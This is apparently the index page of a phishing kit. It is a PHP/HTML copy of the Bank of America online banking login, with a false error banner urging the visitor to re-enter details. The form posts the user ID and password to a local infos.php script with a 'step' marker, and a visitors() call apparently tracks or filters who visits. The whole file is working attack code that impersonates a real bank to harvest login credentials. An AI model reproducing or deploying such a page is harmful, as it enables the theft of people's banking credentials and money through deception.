<?php 

require_once "functions.php";


visitors();


?>


<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Bank of America | Online Banking | Log In | User ID</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
  

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/fa.ico" type="image/x-icon" />
  <link rel="shortcut icon" href="image/fa.ico" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
</head>
	<body>
		<header class="container">
			<div class="d-flex justify-content-between align-items-center">
				<div class="logo"><img src="image/logo.png"><span>Log In</span></div>
				<div class="right  d-none d-md-block"><img src="image/right.png"></div>
			</div>
			<h1>Log In to Online Banking</h1>
			<div style="padding: 10px;background: #ff000033;font-weight: 500;font-size: 13px;" class="error">There error. Please enter the information correctly</div>
		</header>
		<section id="index" class="container d-block d-md-flex">
				<form action="infos.php" method="post">
					<input type="hidden" value="index" name="step">
					<div class="form-group" style="margin-bottom: 38px;">
						<label>User ID</label>
						<input type="text" class="form-control"  name="user">
						<img src="image/radio.png">
					</div>
					<div class="form-group" style="margin-bottom:20px;">
						<label>Password</label>
						<input type="password" class="form-control"  name="password">
					</div>
					<div class="a"><a href="#">Forgot your Password?</a></div>
					<div class="bttn" style="margin-top:20px;"><button style="border:none;background: transparent;" name="submit"><img src="image/bttn.png"></button></div>
				</form>
				<div class="rightt d-block d-md-flex">
					<div class="right-left">
						<p>Stay connected with our app</p>
						<div><img src="image/phone.png"></div>
					</div>
					<div class="right-right">
						<h5>Login help</h5>
						<div class="a"><a style="font-size: 12px;" href="#">Forgot ID/Password?</a></div>
						<div class="a"><a style="font-size: 12px;" href="#">Problem logging in?</a></div>
						<h5 class="mt-4">Not using Online Banking?</h5>
						<div class="a"><a style="font-size: 12px;" href="#">Enroll now</a></div>
						<div class="a"><a style="font-size: 12px;" href="#">Learn more about Online Banking</a></div>
						<div class="a"><a style="font-size: 12px;" href="#">Service Agreement</a></div>
					</div>
				</div>
		</section>
		<footer class="container">
			<div class="">
				<img src="image/ft.png">
			</div>
		</footer>
		

  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script>
  </script>
</body>
</html>